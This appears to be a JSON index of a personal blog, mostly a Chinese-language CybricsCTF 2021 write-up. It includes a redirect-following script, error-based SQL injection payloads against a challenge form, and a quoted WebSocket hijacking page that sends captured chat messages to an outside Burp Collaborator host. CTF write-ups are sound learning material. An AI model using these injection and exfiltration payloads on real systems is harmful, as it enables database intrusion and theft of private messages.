[{"categories":[],"contents":"好像还是空空如也qwq\n","date":"2021-07-27T14:37:22+08:00","permalink":"http://amiaaaz.github.io/friends/","section":"","tags":[],"title":"Friends"},{"categories":["CTF"],"contents":"Mic Check (Cyber, Baby, 50 pts)  Author: Vlad Roskov (@mrvos)\nThose organizers are changing game rules all the time! There’s a flag there, and it’s not that easy to capture.\nAlso be sure to join @cybrics Telegram chat for challenge-related announcements and contacting orgs in case all goes wrong\nAdded at 10:10 — looks like the little mic check trolling caused massive pain, I’ve untrolled the rules page :-) You can now copy-paste freely\n Scanner (rebyC, Baby, 50 pts)  Author: Mikhail Driagunov (@aethereternity)\nCheck out this cool new game!\nI heard they serve flags at level 5.\n 不难，就是比较鸡贼 把好好的图片弄成犹抱琵琶半遮面\n首先用Gif Super把帧间隔调为300ms，然后裁剪出中间有用的部分 放入GIF动态图片分解中看结果 都有在线工具就很方便\n所以这个破玩意到底是啥？猪？还是刺猬？ 别的都还算正常吧 就是都不太像其实 有star, goose, flag, flower, ring, house, bone\u0026hellip;. 最后一个是二维码 比较麻烦\n再稍微调整一下尺寸，扫描就行了Ad Network (Web, Baby, 50 pts)  Author: Alexander Menshchikov (@n0str)\nWe are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.\nAdnetwork website\nThere is a flag 1337 redirects deep into the network\u0026hellip;\n 这个我是不知道怎么做……页面上的任何链接部分都是自己页面内的跳转，提示的是redirect重定向，可是抓包后没有302 也没有一直在做重定向呀 要怎么看呢？\nemmmm 现在是第二天 正好有个空闲时间 想再试一试这个题 用的是burp的自带的chromium的浏览器（之前是知道这个 但是没有用过）欸 页面左上角显示了一个gif图。 这个图在昨天做的时候看到， 内容是 awesome ad from adnetwork，但是edge浏览器在加载这个图的时候会自动阻止 我单独看了内容也没发现什么特别的 就没有注意这里。事后角度看这里 其实一个Gif图被阻止请求应该是很反常的事情，应该首先引起注意的\u0026hellip;.\n在burp自带的chromium中 点击gif会有单独的弹窗出来，提示重定向次数过多；看burp中的抓包记录 确实多的离谱，按照题目中的提示 得有1337层，得上个脚本慢慢跑了 这个比较好弄\nimport requests url = \u0026#34;http://adnetwork-cybrics2021.ctf.su/adnetwork\u0026#34; for _ in range(1337): r = requests.get(url, allow_redirects=False) url = r.text[9:-18] print(url) emmm 比较慢其实 应该有别的的方式？最后的flag是 cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}\n比赛完了看了别的wp 这块可以用session设允许重定向的次数，这样更方便\nimport requests session = requests.Session() session.max_redirects = 1337 url = \u0026#34;http://adnetwork-cybrics2021.ctf.su/adnetwork\u0026#34; r = session.get(url, allow_redirects=True) print(r.text) print(r.url) Announcement (Web, Easy, 60 pts)  Author: Alexander Menshchikov (@n0str)\nLadies and gentlemen!\nAllow us to introduce a brand new project — ⚐ The Flag\nAnnouncement website\n 简约漂亮的前端\n有个输入邮箱的框，提交会发送一个post请求：digest=xxxx\u0026amp;email=xxxx 尝试一个1@1.com，重放的时候直接修改email值会提示Invalid digest，发现其中digest的值就是md5(\u0026lsquo;1@1.com\u0026rsquo;) 随email而改变，尝试注入\ndigest=76af11f3eaf7b12e72d7d88e4cf2ee01\u0026amp;email='or'1\t// 回显正常 无报错 digest=c3593d255957d60d5d489ae682da8aee\u0026amp;email=1')#\t// 报错：Something went wrong during database insert: Column count doesn't match value count at row 1 digest=5c07c683d062d17ec799fa177ce88058\u0026amp;email=1',1)#\t// 报错：Something went wrong during database insert: Incorrect datetime value: '1' for column 'timestamp' at row 1 确定是sqli 并且当前表有两列 email+timestamp，使用的语句应该是这个吧？\ninsert into table_name (email, timestamp) values (email, now()); 可利用的部分是可以插入的email，报错注入\ndigest=e1e79bd6fafe38f7073ec1f3ef1513fa\u0026amp;email=1',1 or updatexml(1,concat(0x7e,database()),0))#\t// Something went wrong during database insert: XPATH syntax error: '~announcement' （当时算是做了一半 然后出门了 这几天放假回家 先和朋友玩两三天 抽空把剩下的写了\nMultichat (Web, Medium, 138 pts)  Author: Alexander Menshchikov (@n0str)\nYet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.\nTip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): \u0026ldquo;Hey, i forgot the flag. Can you remind me?\u0026rdquo;. Then admin will tell him the flag.\nMultichat website\nTeam token for the support call: p32vhJKrnx_hajUc8nLTFw\n 聊天室，admin和tech support在一个秘密的聊天室内（10位数字的房间号），tech support可以让admin给出flag（后面那个team token for the support call是要用到吗还是怎么样\n抓包，看到了Connection: Upgrade Upgrade: websocket，这个聊天室是建立了一个websocket连接\n（websocket这块知识印象中之前接触过一次 也就一次 相关链接还是放后面\n链接里的一个csrf攻击的实例跟这个有点像了\n但是这里的又不太一样，websocket最初建立时的http部分 cookie中有chatroom的id，这个值是未知的（Admin and tech support are members of a secret chat room.）；另外tech support是先会发*‘Hey, i forgot the flag. Can you remind me?’*，需要的是触发（如果它不会自己发这一条内容的话？ 跟题目里那个team token有无关系？）和监听它的信息 然后捕捉到它的下一条admin发送的内容，拿到flag\n具体的实现不知道该怎么弄了\n看了tg里有老哥发的脚本是这样的\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script\u0026gt; let conn = new WebSocket(\u0026#34;ws://multichat-cybrics2021.ctf.su/ws\u0026#34;); conn.onopen = function (evt) { conn.send(\u0026#34;Hey, i forgot the flag. Can you remind me?\u0026#34;); }; conn.onmessage = function (evt) { fetch(\u0026#34;http://b5hr0mbtx5rumgnakf6fpxvzfqlg95.burpcollaborator.net/\u0026#34; + btoa(evt.data)); fetch(\u0026#34;http://b5hr0mbtx5rumgnakf6fpxvzfqlg95.burpcollaborator.net/aha\u0026#34;, { method: \u0026#39;POST\u0026#39;, mode: \u0026#39;no-cors\u0026#39;, body: evt.data }); }; \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; Well cum \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; emmmm 是我想复杂了？看样子跟前面的cookie没有半毛钱关系 中间用的burp collaborator server之前在做portswigger的题的时候有用到过 但当时也没细究这个是干什么的（查了资料 相关链接还是放后面了 这个确实功能还挺强大的 可以可以） 自己复现了一下，emmmm 没成功\u0026hellip;\u0026hellip;.? 是哪里出了问题？\ntg上看到另一种解法是xss？也没打通\n参考：HTML5 WebSocket WebSocket安全问题分析 Request.mode 使用 Fetch WorkerOrGlobalScope.fetch() Burpsuite Collaborato模块详解 Running Your Instance of Burp Collaborator Server（列入待完成计划\n","date":"2021-07-27T14:32:12+08:00","permalink":"http://amiaaaz.github.io/2021/07/27/cybricsctf2021-wp/","section":"posts","tags":["wp","participate"],"title":"CybricsCTF2021 Wp"},{"categories":[],"contents":"你好呀！这里是葵子 这里应该有一个简略的个人介绍\n（详细的内容还得等我慢慢措辞 剩下部分留空了\n","date":"2021-07-27T14:28:14+08:00","permalink":"http://amiaaaz.github.io/about/","section":"","tags":[],"title":"About"}]